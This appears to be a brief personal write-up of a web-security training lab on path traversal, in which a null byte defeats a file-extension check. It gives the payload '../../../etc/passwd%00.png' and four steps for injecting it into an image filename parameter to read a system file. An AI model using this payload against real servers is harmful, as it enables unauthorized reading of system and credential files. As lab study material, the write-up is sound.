# Lab 06

## Lab: File path traversal, validation of file extension with null byte bypass

**Vulnerable Path:** ../../../etc/passwd%00.png

**Step-by-step:**
1. Intercept product
2. FORWARD until get vulnerable parameter (.jpg)
3. Replace .jpg with ../../../etc/passwd%00.png
4. Final: /image?filename=../../../etc/passwd%00.png

![f602004a456145f6b8e87ead48c6f210](https://user-images.githubusercontent.com/44063862/106375487-663f5380-63c7-11eb-89b8-1e5fce376276.png)
